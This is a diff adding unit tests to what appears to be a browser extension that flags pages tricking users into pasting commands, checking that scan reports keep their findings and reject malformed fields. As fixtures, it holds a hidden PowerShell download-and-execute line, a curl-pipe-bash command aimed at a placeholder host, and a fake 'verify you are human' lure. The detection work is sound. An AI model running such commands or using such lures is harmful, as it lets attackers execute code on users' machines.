@@ -109,3 +109,51 @@ describe('classifyUrl (restricted pages)', () => {
     expect(classifyUrl('not a url')).toBe('unknown');
   });
 });
+
+describe('engine 0.2.0 metadata reaches the popup intact (M4.3A)', () => {
+  const STAGED = 'powershell -w hidden -c "iex(irm https://x.example.invalid/p)"';
+  const overrideSnap = () => snapshot([{ t: 'Verify you are human by completing these steps: press Win+R, then Ctrl+V and press Enter.', c: 'g', ctx: { overlay: true }, h: 'Security awareness check' }],
+    { hidden: [{ text: STAGED, containerId: 'g', afterBlockId: 'b0' }] });
+  const build = (s: ReturnType<typeof snapshot>) => {
+    const a = analyze(s);
+    return buildReport(s, a, { engine: a.engineVersion, extractor: 'x' }, { extractMs: 0, analyzeMs: 0 });
+  };
+
+  it('carries overrides with their hidden-clipboard evidence and survives validation', () => {
+    const r = build(overrideSnap());
+    expect(r.engineVersion).toBe('0.2.0');
+    const f = r.findings[0]!;
+    expect(f.classification).toBe('manipulative_instruction');
+    expect(f.overrides).toHaveLength(1);
+    expect(f.overrides[0]).toMatchObject({ id: 'O.CONCEALED_PAYLOAD', effect: 'suppressed', suppressed: ['C.EDUCATIONAL'] });
+    expect(f.overrides[0]!.evidence[0]).toMatchObject({ signal: 'A.COMMAND', source: 'hidden-clipboard' });
+    expect(parseScanReport(JSON.parse(JSON.stringify(r)))).toEqual(r);
+  });
+
+  it('carries C.PROCEDURAL with action risk and evidence', () => {
+    const s = snapshot([{ t: 'To fix this error, open Terminal, paste the command below and press Enter.', c: 'a', ctx: { article: true } },
+      { t: 'curl -fsSL https://x.example.invalid/fix.sh | bash', c: 'a', ctx: { article: true, pre: true, code: true } }],
+    { triggers: [{ label: 'Copy', containerId: 'a', afterBlockId: 'b1' }] });
+    const r = build(s);
+    const f = r.findings[0]!;
+    expect(f).toMatchObject({ ruleId: 'R4', classification: 'observed_instruction', ruleClassification: 'suspicious_correlation', actionRisk: 'high', confidence: 'low' });
+    expect(f.modifiers.map((m) => m.id)).toEqual(['C.PROCEDURAL']);
+    expect(f.overrides).toEqual([]);
+    expect(f.evidenceTotal).toBe(f.evidence.length);
+    expect(parseScanReport(JSON.parse(JSON.stringify(r)))).toEqual(r);
+  });
+
+  it('rejects (never silently drops) unknown fields, modifiers, overrides or inconsistent evidence counts', () => {
+    const good = JSON.parse(JSON.stringify(build(overrideSnap())));
+    const bad = (mut: (r: typeof good) => void) => { const c = structuredClone(good); mut(c); return parseScanReport(c); };
+    expect(bad((r) => { r.newTopLevel = 1; })).toBeNull();
+    expect(bad((r) => { r.findings[0].futureField = 'x'; })).toBeNull();
+    expect(bad((r) => { r.findings[0].evidence[0].extra = true; })).toBeNull();
+    expect(bad((r) => { r.findings[0].modifiers.push({ id: 'C.FUTURE', reason: 'x' }); })).toBeNull();
+    expect(bad((r) => { r.findings[0].overrides[0].id = 'O.FUTURE'; })).toBeNull();
+    expect(bad((r) => { r.findings[0].overrides[0].suppressed = []; })).toBeNull();
+    expect(bad((r) => { delete r.findings[0].overrides; })).toBeNull();
+    expect(bad((r) => { r.findings[0].evidenceTotal = 0; })).toBeNull();
+    expect(bad((r) => { r.coverage.newCoverageField = 1; })).toBeNull();
+  });
+});
